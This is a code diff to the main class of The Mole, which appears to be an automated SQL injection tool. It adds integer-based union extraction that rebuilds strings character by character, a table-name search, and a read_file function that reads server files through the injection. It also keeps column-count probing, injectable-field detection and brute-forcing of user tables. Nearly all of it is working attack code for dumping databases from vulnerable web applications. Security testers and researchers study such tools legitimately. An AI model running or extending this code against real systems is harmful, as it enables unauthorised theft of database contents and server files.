@@ -33,7 +33,7 @@ from threader import Threader
 from output import BlindSQLIOutput
 from xmlexporter import XMLExporter
 import connection
-import sys, time
+import time
 
 class TheMole:
 
@@ -78,6 +78,7 @@ class TheMole:
         self.comment = ''
         self.parenthesis = 0
         self._dbms_mole = None
+        self.stop_query = False
         self.database_dump = DatabaseDump()
 
     def restart(self):
@@ -207,11 +208,45 @@ class TheMole:
             count = int(result[0])
             if count == 0:
                 return []
+            print('\r[+] Rows: ' + str(count), end='')
+            dump_result = []
+            self.stop_query = False
+            dump_result = self.threader.execute(count, lambda i: self._generic_query_item(query_generator, i, result_parser))
+            dump_result.sort()
+            return dump_result
+
+    def _generic_integer_query_item(self, query_generator, index, offset, sqli_output):
+        if self.stop_query:
+            return None
+        req = self.get_requester().request(self.generate_url(query_generator(index+1, offset=offset)))
+        result = self._dbms_mole.parse_results(self.analyser.decode(req))
+        if not result or len(result) < 1:
+            raise QueryError()
+        else:
+            result = chr(int(result))
+            sqli_output.set(result, index)
+            return result
+
+    def _generic_integer_query(self, count_query, length_query, query_generator, result_parser = lambda x: x[0], is_integer_query = False):
+        req = self.get_requester().request(self.generate_url(count_query))
+        result = self._dbms_mole.parse_results(self.analyser.decode(req))
+        if not result:
+            raise QueryError('Count query failed.')
+        else:
+            count = int(result)
+            if count == 0:
+                return []
             sys.stdout.write('[+] Rows: ' + str(count) + '\r')
             sys.stdout.flush()
             dump_result = []
             self.stop_query = False
-            dump_result = self.threader.execute(count, lambda i: self._generic_query_item(query_generator, i, result_parser))
+            for i in range(count):
+                length = self._dbms_mole.parse_results(self.analyser.decode(self.requester.request(self.generate_url(length_query(i)))))
+                length = int(length)
+                sqli_output = BlindSQLIOutput(length)
+                dump_result.append(''.join(self.threader.execute(length, lambda x: self._generic_integer_query_item(query_generator, x, i, sqli_output))))
+                if not self.stop_query:
+                    sqli_output.finish()
             dump_result.sort()
             return dump_result
 
@@ -219,12 +254,21 @@ class TheMole:
         if not force_fetch and self.database_dump.db_map:
             return list(self.database_dump.db_map.keys())
         if self.mode == 'union':
-            data = self._generic_query(
-                self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field),
-                lambda x: self._dbms_mole.schema_query(
-                    self.query_columns, self.injectable_field, x
+            if self._dbms_mole.is_string_query():
+                data = self._generic_query(
+                    self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.schema_query(
+                        self.query_columns, self.injectable_field, x
+                    )
                 )
-            )
+            else:
+                data = self._generic_integer_query(
+                    self._dbms_mole.schema_integer_count_query(self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.schema_integer_len_query(self.query_columns, self.injectable_field, offset=x),
+                    lambda index,offset: self._dbms_mole.schema_integer_query(
+                        index, self.query_columns, self.injectable_field, offset=offset
+                    )
+                )
         else:
             data = self._blind_query(
                 lambda x,y: self._dbms_mole.schema_blind_count_query(x, y),
@@ -246,12 +290,21 @@ class TheMole:
         if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
             return list(self.database_dump.db_map[db].keys())
         if self.mode == 'union':
-            data = self._generic_query(
-                self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field),
-                lambda x: self._dbms_mole.table_query(
-                    db, self.query_columns, self.injectable_field, x
-                ),
-            )
+            if self._dbms_mole.is_string_query():
+                data = self._generic_query(
+                    self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.table_query(
+                        db, self.query_columns, self.injectable_field, x
+                    ),
+                )
+            else:
+                data = self._generic_integer_query(
+                    self._dbms_mole.table_integer_count_query(db, self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.table_integer_len_query(db, self.query_columns, self.injectable_field, offset=x),
+                    lambda index,offset: self._dbms_mole.table_integer_query(
+                        index, db, self.query_columns, self.injectable_field, offset=offset
+                    )
+                )
         else:
             data = self._blind_query(
                 lambda x,y: self._dbms_mole.table_blind_count_query(x, y, db=db),
@@ -273,12 +326,21 @@ class TheMole:
         if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
             return list(self.database_dump.db_map[db][table])
         if self.mode == 'union':
-            data = self._generic_query(
-                self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field),
-                lambda x: self._dbms_mole.columns_query(
-                    db, table, self.query_columns, self.injectable_field, x
+            if self._dbms_mole.is_string_query():
+                data = self._generic_query(
+                    self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.columns_query(
+                        db, table, self.query_columns, self.injectable_field, x
+                    )
                 )
-            )
+            else:
+                data = self._generic_integer_query(
+                    self._dbms_mole.columns_integer_count_query(db, table, self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.columns_integer_len_query(db, table, self.query_columns, self.injectable_field, offset=x),
+                    lambda index,offset: self._dbms_mole.columns_integer_query(
+                        index, db, table, self.query_columns, self.injectable_field, offset=offset
+                    )
+                )
         else:
             data = self._blind_query(
                 lambda x,y: self._dbms_mole.columns_blind_count_query(x, y, db=db, table=table),
@@ -292,13 +354,22 @@ class TheMole:
 
     def get_fields(self, db, table, fields, where="1=1"):
         if self.mode == 'union':
-            return self._generic_query(
-                self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where),
-                lambda x: self._dbms_mole.fields_query(
-                    db, table, fields, self.query_columns, self.injectable_field, x, where=where
-                ),
-                lambda x: x
-            )
+            if self._dbms_mole.is_string_query():
+                return self._generic_query(
+                    self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where),
+                    lambda x: self._dbms_mole.fields_query(
+                        db, table, fields, self.query_columns, self.injectable_field, x, where=where
+                    ),
+                    lambda x: x
+                )
+            else:
+                return map(lambda x: x.split(self._dbms_mole.blind_field_delimiter()), self._generic_integer_query(
+                    self._dbms_mole.fields_integer_count_query(db, table, self.query_columns, self.injectable_field),
+                    lambda x: self._dbms_mole.fields_integer_len_query(db, table, fields, self.query_columns, self.injectable_field, offset=x),
+                    lambda index,offset: self._dbms_mole.fields_integer_query(
+                        index, db, table, fields, self.query_columns, self.injectable_field, offset=offset
+                    )
+                ))
         else:
             return self._blind_query(
                 lambda x,y: self._dbms_mole.fields_blind_count_query(x, y, db=db, table=table, where=where),
@@ -308,12 +379,25 @@ class TheMole:
 
     def get_dbinfo(self):
         if self.mode == 'union':
-            req = self.get_requester().request(
-                    self.generate_url(
-                        self._dbms_mole.dbinfo_query(self.query_columns, self.injectable_field)
-                    )
-                  )
-            data = self._dbms_mole.parse_results(self.analyser.decode(req))
+            if self._dbms_mole.is_string_query():
+                req = self.get_requester().request(
+                        self.generate_url(
+                            self._dbms_mole.dbinfo_query(self.query_columns, self.injectable_field)
+                        )
+                      )
+                data = self._dbms_mole.parse_results(self.analyser.decode(req))
+            else:
+                length = self._dbms_mole.parse_results(self.analyser.decode(self.requester.request(
+                            self.generate_url(self._dbms_mole.dbinfo_integer_len_query(self.query_columns, self.injectable_field))
+                         )))
+                length = int(length)
+                sqli_output = BlindSQLIOutput(length)
+                query_generator = lambda index,offset: self._dbms_mole.dbinfo_integer_query(
+                                    index, self.query_columns, self.injectable_field
+                                 )
+                data = ''.join(self.threader.execute(length, lambda x: self._generic_integer_query_item(query_generator, x, 0, sqli_output)))
+                sqli_output.finish()
+                return data.split(self._dbms_mole.blind_field_delimiter())
         else:
             data = self._blind_query(
                 None,
@@ -328,6 +412,21 @@ class TheMole:
             raise QueryError()
         else:
             return data
+
+    def find_tables_like(self, db, table_filter):
+        data = self._generic_query(
+                self._dbms_mole.tables_like_count_query(db, self.query_columns, self.injectable_field, table_filter), 
+                lambda x: self._dbms_mole.tables_like_query(
+                    db, self.query_columns, self.injectable_field, table_filter, x
+                ),
+            )
+        return data
+
+    def read_file(self, filename):
+        data = self._generic_query_item(
+                    lambda x: self._dbms_mole.read_file_query(filename, self.query_columns, self.injectable_field), 0, lambda x: ''.join(x)
+                )
+        return data
 
     def brute_force_tables(self, db, table_list):
         for table in table_list:
@@ -350,7 +449,6 @@ class TheMole:
 
     def brute_force_users_tables(self, db):
         self.brute_force_tables(db, TheMole.users_tables)
-
 
     def set_url(self, url):
         if not '?' in url:
@@ -397,16 +495,13 @@ class TheMole:
                     count_fun('>', last)
                 )
             )
-            sys.stdout.write(trying_msg(last))
-            sys.stdout.flush()
+            print(trying_msg(last), end='')
             if self.needle in self.analyser.decode(req):
                 break;
             last *= 2
-        sys.stdout.write(max_msg(str(last)))
-        sys.stdout.flush()
+        print(max_msg(str(last)), end='')
         pri = last // 2
         while pri < last:
-
             if self.stop_query:
                 return pri
             medio = ((pri + last) // 2) + ((pri + last) & 1)
@@ -484,7 +579,7 @@ class TheMole:
 
 
     def _find_separator(self):
-        separator_list = ['\'', '"', ' ', '\0']
+        separator_list = ['\'', '"', ' ']
         equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
         separator = None
         for parenthesis in range(0, 3):
@@ -552,20 +647,17 @@ class TheMole:
         )
         while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
             last *= 2
-            sys.stdout.write('\r[i] Trying ' + str(last) + ' columns     ')
-            sys.stdout.flush()
+            print('\r[i] Trying ' + str(last) + ' columns     ', end='')
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
                     self.generate_url(' order by %d ' % (last,))
                 )
             )
         pri = last // 2
-        sys.stdout.write('\r[i] Maximum length: ' + str(last) + '     ')
-        sys.stdout.flush()
+        print('\r[i] Maximum length: ' + str(last) + '     ', end='')
         while pri < last:
             medio = ((pri + last) // 2) + ((pri + last) & 1)
-            sys.stdout.write('\r[i] Trying ' + str(medio) + ' columns     ')
-            sys.stdout.flush()
+            print('\r[i] Trying ' + str(medio) + ' columns     ', end='')
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
                     self.generate_url(' order by %d ' % (medio,))
@@ -622,7 +714,7 @@ class TheMole:
             query = dbms_mole_class.field_finger_query(self.query_columns, finger, field)
             url_query = self.generate_url(query)
             req = self.get_requester().request(url_query)
-            if dbms_mole_class.field_finger() in self.analyser.decode(req):
+            if dbms_mole_class.field_finger(finger) in self.analyser.decode(req):
                 self.injectable_field = field
                 print('[+] Found injectable field:', field + 1)
                 return True
